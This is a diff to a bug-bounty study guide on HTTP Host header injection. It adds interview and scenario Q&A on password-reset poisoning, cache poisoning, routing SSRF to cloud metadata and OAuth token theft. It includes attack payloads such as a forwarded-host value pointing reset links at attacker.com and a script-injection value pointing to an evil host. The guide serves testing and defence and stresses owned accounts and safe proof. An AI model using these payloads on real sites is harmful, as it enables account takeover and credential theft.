@@ -1,5 +1,7 @@
 # HTTP Host Header Injection — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)
 
+**Author:** x8bitranjit
+
 > A complete, in-depth study + field reference for **HTTP Host header attacks** — from "what is the Host header" to
 > password-reset poisoning, web-cache poisoning, web cache deception, routing-based SSRF, and RCE chains. Q&A format,
 > progressive difficulty. Covers the spoofing-header family, validation bypasses, every sink (reset links / redirects /
@@ -25,6 +27,8 @@
 - **Level 3 — Password-reset poisoning & redirect/link poisoning** (Q33–Q44)
 - **Level 4 — Web cache poisoning & web cache deception** (Q45–Q60)
 - **Level 5 — Routing SSRF, path-override, SSO & expert chains** (Q61–Q78)
+- **Level 6 — Interview questions (articulate it out loud)** (Q101–Q112)
+- **Level 7 — Scenario-based (you're handed a situation)** (Q113–Q120)
 - **Tooling** (Q79–Q83)
 - **Black-box methodology & checklist** (Q84–Q87)
 - **Cheat sheets** (Q88–Q92)
@@ -489,6 +493,89 @@ Don't route to backends based on a **client-supplied** host; map vhosts server-s
 
 ### Q100. One-paragraph summary you can quote.
 *"The Host header (and the `X-Forwarded-*` family) is attacker-controlled input — so never use it to build links, key caches, route backends, or make access decisions. Generate absolute URLs from a server-configured canonical domain (this kills password-reset poisoning), validate `Host` against an allowlist and ignore forwarding headers unless they come from a trusted proxy, include any response-affecting header in the cache key (and `Vary`) while never caching authenticated responses by extension (this kills web-cache poisoning and deception), and route/authorize on server-side configuration rather than the client's host or `X-Original-URL` (this kills routing SSRF and path-override). A single trusted header can otherwise become account takeover, mass stored XSS, theft of other users' private pages, or a path into the internal network and cloud."*
+
+---
+
+# LEVEL 6 — INTERVIEW QUESTIONS (articulate it out loud)
+
+> These test whether you can *explain* Host-header attacks — why "just a header" is a real bug, and the "one header, classify the sink" method — not just paste `X-Forwarded-Host`. Say each out loud; aim for plain → mechanism → the proof that ends the argument.
+
+### Q101. Explain Host header injection to a junior in one minute — why is "just a header" a real bug?
+*Plain:* "The `Host` header tells the server which site you're asking for — but *you* write it, it's just text. Lazy apps then **trust** it: they build the password-reset link from it, pick which backend to route to from it, or cache a page keyed on it. So by lying in one header I can make the server email a victim a link pointing at *my* server, or dial an internal system, or poison a page for everyone."
+*Why it pays:* the impact isn't "a header" — it's **account takeover** (reset poisoning), **SSRF to cloud metadata** (routing), or **mass XSS** (cache poisoning). "I report the outcome, not the reflection."
+
+### Q102. Why is "the Host header is reflected" NOT a finding? What makes it one?
+Reflection alone is a **lead** — the page echoing your host does nothing by itself. It becomes a finding when that reflected host reaches a **dangerous sink**: a **password-reset link** (→ token capture → ATO), an **absolute `<script src>` that gets cached** (→ mass XSS), a **redirect `Location`** (→ open redirect/phishing), or **routing** (→ SSRF). "The rule: 'reflected in a link' is a Medium at best; 'reflected into the reset email a victim clicks, sending me their token' is a High/Critical. I chase the sink, not the echo (§15)."
+
+### Q103. Walk me through the "one header, classify the sink" method out loud.
+"I don't guess payloads — I baseline what the *effective host* actually *does* (§4). I send the host three ways: normal, an evil host, and an internal one. Then I read which sink I have: **reflected** in a link/redirect → reset-poisoning/XSS/redirect; **reflected + cached** → cache poisoning; **routes to different backends** (internal content on `Host: localhost`) → routing-SSRF; **builds an OAuth callback** → token theft. One header, but the *sink* decides the whole attack — so I classify first, then fire the matching exploit (§13.2)."
+
+### Q104. Compare the three big cash-outs — reset-poisoning vs cache-poisoning vs routing-SSRF. How do you tell which you have?
+- **Reset-poisoning (§11):** the host is **reflected into a generated URL** (the reset/invite email). Tell: the mailed link uses my `Host`/`X-Forwarded-Host`. → capture the victim's token → **ATO** (0-click).
+- **Cache-poisoning (§12):** the host is **reflected into cached HTML** (an absolute `<script src>`/`Location`) *and* the header is **unkeyed**. Tell: a poisoned response is served to a *different* session. → **mass XSS/redirect**.
+- **Routing-SSRF (§13):** the front-end **uses the host to pick a backend**. Tell: `Host: localhost`/an internal name returns **different internal content**, or `Host: <oob>` produces a hit from the *front-end's* IP. → **cloud metadata / internal admin**.
+"Same header; the baseline (§4) tells me which of the three by what changes."
+
+### Q105. Explain password-reset poisoning — where does the attacker's host end up, and why is it 0-click?
+"When the app sends a reset email, it builds `https://<HOST>/reset?token=…` and fills `<HOST>` from my request's `Host`/`X-Forwarded-Host`. So I trigger a reset *for the victim* with `X-Forwarded-Host: attacker.com`; the server mails the *victim* a link pointing at *my* domain, carrying *their* real token. They click (a reset they may expect), their browser hands my server the token, I set their password, I'm in. **0-click for me, unauthenticated** — I never touch the victim beyond the email the app itself sends (§11)."
+
+### Q106. What's routing-based SSRF, and why is it the "sleeper Critical"?
+It's when the **front-end/reverse-proxy uses the `Host` to decide which backend to forward to** — so `Host: 169.254.169.254` (or an internal name) makes the proxy dial *that* target and return its response. That's SSRF via a plain header, no URL parameter needed. It's the "sleeper" because it looks like a boring reflected-host test but reaches **cloud metadata → IAM creds → cloud takeover** (§13.2). *Different from reflection:* reflection echoes the host into content; routing **connects to** the host. "I confirm it with an OOB hit from the front-end's own IP — that's the tell it's *fetching*, not echoing."
+
+### Q107. Why does an unkeyed `X-Forwarded-Host` turn a self-XSS into everyone's XSS?
+A cache stores a response under a **cache key** (usually method + path + some headers). If `X-Forwarded-Host` is **not in the key** but *is* reflected into the HTML, then my one poisoned request — reflecting `X-Forwarded-Host: evil"><script src=//evil/x.js>` — gets **stored** and served to **every later visitor of that path**, who never sent my header. "The reflection is only *my* XSS; the *cache* is what makes it *everyone's*. So after I see the host reflected, my next question is always 'is it cached, and is the header keyed?' (§12.1, Kettle 2018)."
+
+### Q108. A dev says "we validate the Host header." What do you check before believing it?
+Whether they validate **every** host-influencing input, not just `Host`. Check the **forwarding family**: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-Host` — apps often validate `Host` but trust these downstream. Check **parser gaps**: a **dual `Host:`** header, the **absolute-form request line** (`GET https://evil.com/ …`), a **`Host: real.com:@evil.com`** userinfo trick, **CRLF**, and **suffix/substring** matches (`real.com.evil.com`). "'We validate Host' usually means 'we validate *the* `Host` header' — I test the whole family and the parser tricks (§7)."
+
+### Q109. Why do `X-Forwarded-Host` / absolute-URI / dual-Host bypass a Host check?
+Because different components read the host from **different places**. A validator checks the `Host` header; but the *app* that builds the reset link may prefer **`X-Forwarded-Host`** (set by proxies), or the *server* may honor the **absolute-form request-URI** over the `Host` header, or a **second `Host`** header may be read by the backend while the front-end validated the first. "It's a disagreement between which layer trusts which host source — I make the *validated* source and the *used* source differ (same idea as request-smuggling's parser disagreements)."
+
+### Q110. How do you prove a Host-header bug safely (reset, cache, SSRF each)?
+- **Reset-poisoning:** two accounts *you own*; trigger a reset for your victim `B`, catch `B`'s token at **your** listener, log in as `B`, then **restore `B`** — never a real user.
+- **Cache-poisoning:** poison a **non-shared key** (add a unique cache-buster / target a path only you request) so you prove the mechanism **without serving XSS to real users**; a benign marker, not a live payload.
+- **Routing-SSRF:** point `Host` at **your own OOB** first to confirm reach; for metadata, read the role/creds and validate **read-only** (`aws sts get-caller-identity`), then **describe and stop**.
+"The finding is the mechanism; I never harm real users or use the creds (§19)."
+
+### Q111. Curveballs — one sentence each.
+- **"Does HTTPS/SNI fix it?"** No — SNI picks the TLS cert, but the app still reads the plaintext `Host` header (and `X-Forwarded-Host`) to build URLs/route; they can differ.
+- **"Does a WAF fix it?"** No — a valid-looking `X-Forwarded-Host: attacker.com` isn't an attack signature; the trust is the bug.
+- **"Is `ALLOWED_HOSTS` enough?"** It's the *right* fix for the `Host` header, but only if it also covers the forwarding headers and you build sensitive URLs from **config**, not the request.
+- **"Does the CDN rewrite Host, so we're safe?"** Often the opposite — the CDN sets `X-Forwarded-Host` from *your* input and the origin trusts it; test through the real edge.
+- **"It's cached but has `Cache-Control: private`?"** Check the *actual* behavior — a shared CDN may still cache it, or a keying gap may apply; don't trust the header alone.
+
+### Q112. What's the single best remediation, and why isn't "strip X-Forwarded-Host" it?
+**Validate the effective host against an explicit allow-list (`ALLOWED_HOSTS`-style, never `*`) AND build all sensitive/absolute URLs (reset links, redirects) from server configuration, not from any request header.** Stripping just `X-Forwarded-Host` misses `X-Host`/dual-`Host`/absolute-URI and doesn't help the *routing* or *cache* sinks. "Django added `ALLOWED_HOSTS` for exactly this class (CVE-2011-4139/2012-4520) — allow-list the host and stop deriving URLs from it; that closes reset-poisoning, link-poisoning, and cache-poisoning at once."
+
+---
+
+# LEVEL 7 — SCENARIO-BASED (you're handed a situation → what do you do)
+
+> Each is a realistic snapshot. The skill tested is *classifying the sink* — reading what the effective host does, then routing to the one exploit that pays (or correctly recognising a lead).
+
+### Q113. The reset email link uses your injected `X-Forwarded-Host`. Walk the ATO and the safe proof.
+Two accounts you own (`A`=attacker inbox, `B`=victim). **(1)** Trigger a reset **for `B`** with `X-Forwarded-Host: attacker.com`. **(2)** The server mails `B` a link `https://attacker.com/reset?token=<B's token>`; when `B` clicks (or the reset page/mail pre-fetches your resource → `Referer`), the token lands at **your** listener. **(3)** Consume `B`'s token on the *real* site, set a password you know, log in as `B` → read `B`'s own email back = ATO. **(4) Restore `B`'s password** and report **CWE-640/CWE-644, High (0-click ATO)**. "The proof is the token arriving at my host + logging into `B` — not 'the header is reflected in the link' (§11)."
+
+### Q114. `Host: evil.com` is reflected in an absolute `<script src>` on the homepage. Is that XSS? What's the next question?
+Not yet — reflected `evil.com` in a `<script src="//evil.com/…">` is only *your* self-XSS (you'd have to send yourself the header). **The next question is: is the response cached, and is the host header keyed?** If the homepage is served from a **shared cache** and `X-Forwarded-Host` is **unkeyed**, one poisoned request is stored and served to **every** visitor → **mass stored XSS** (Critical). Test: poison via a **cache-buster path** you own, confirm a *second* (clean) request returns *your* injected `src`. "Reflection → check the cache → that's the jump from self-XSS to everyone's (§12, Kettle 2018)."
+
+### Q115. Changing `Host` to `localhost` returns a different internal status page. What do you suspect, and how do you escalate safely?
+A **routing sink** — the front-end forwards based on `Host`, so it's reaching internal backends. Escalate (safely): **(1)** confirm reach with `Host: <your-oob>` → an OOB hit from the front-end's IP proves it *fetches* the host you choose. **(2)** Steer at **`169.254.169.254`** for cloud metadata → the IAM role → temporary creds. **(3)** Validate the creds **read-only** (`aws sts get-caller-identity`) and **stop** — don't list buckets or use the role. Report **CWE-918 routing-SSRF → cloud IAM creds, Critical** (§13.2). "Internal content on `Host: localhost` = it's routing; I confirm OOB, reach metadata, prove read-only, stop."
+
+### Q116. Plain `Host` is validated (400 on `evil.com`), but the reset link still poisons. How?
+The **link builder trusts a *different* host source than the validator.** The `Host` header is checked, but the app constructs the reset URL from **`X-Forwarded-Host`** (or `X-Host`/`X-Forwarded-Server`) which isn't validated. So send a valid `Host: bank.target.com` **plus** `X-Forwarded-Host: attacker.com` — the request passes validation, but the email link uses `attacker.com`. "The validator and the URL-builder disagree on which header is 'the host' — I supply a legit `Host` and poison via the forwarding header (§7/§9)."
+
+### Q117. You reach 169.254.169.254 via the Host header but get a `401`. Diagnose and pivot.
+The instance is on **IMDSv2**, which requires a session token: you must `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`, then send that token as `X-aws-ec2-metadata-token` on the GET. A pure **Host-routing GET** usually can't do the `PUT` + custom-header dance, so IMDSv2 blocks the classic read. **Pivot:** aim the routing-SSRF at an **internal admin/unauth service** instead (a status page, an internal API, a deploy/import feature with code-exec) — reachable via the same routing sink and often a faster path to RCE (§13.1). "401 from metadata = IMDSv2; I stop fighting IMDS and route to internal services."
+
+### Q118. The homepage reflects the host and it's behind a CDN cache. How do you prove mass impact WITHOUT harming real users?
+Prove the **mechanism on a key only you hit**, never the live homepage. Add a **unique cache-buster** (`/?x8-poc=<random>`) so your poisoned response is cached under *your* key, then re-request that exact URL from a **clean session/browser** and show it returns *your* injected `<script src>` — that proves an unkeyed header poisons the cache for any sharer of that key, **without** serving XSS to real homepage visitors. Report with the buster + the second-request evidence and note you avoided the shared key. "Benign marker, private key, two-request proof — I demonstrate the poisoning without poisoning real users (§19)."
+
+### Q119. An OAuth login builds the callback URL from the Host header. Walk the token-theft attack.
+The callback (`redirect_uri`) is derived from `Host`/`X-Forwarded-Host`, so I can make the IdP send the **auth `code`/token to my domain** (§14). **(1)** Start the OAuth flow injecting `X-Forwarded-Host: attacker.com` so the built `redirect_uri` points at me. **(2)** The victim authorizes; the IdP redirects the **`code` to `attacker.com`**. **(3)** I exchange the `code` for tokens → session as the victim → ATO. Prove with two own accounts; the root cause is **deriving `redirect_uri` from an attacker-controlled host** (cross-ref the OAuth kit). "Host injection turns the OAuth callback into a token-delivery to my server."
+
+### Q120. You found reset-poisoning but the program says "self-only, not exploitable." How do you rebut / prove cross-account?
+They're claiming you only poisoned *your own* reset. Rebut by proving **cross-account** with two accounts you own: trigger the reset **for account `B`** (not `A`) with your poisoned host, show **`B`'s** token arriving at your listener, and **log into `B`**. Screenshot: "as an unauthenticated attacker I triggered `B`'s reset, captured `B`'s token at my server, and logged in as `B`." If they argue "the victim must click," note it's **0-click for the attacker** and often fully 0-click via **`Referer` leak / mail pre-fetch** if the reset page loads your resource. "The fix for 'self-only' is to demonstrate the takeover of a *second* account and hand them the token-capture log — that's the difference between a lead and a Critical (§11, §15)."
 
 ---
 
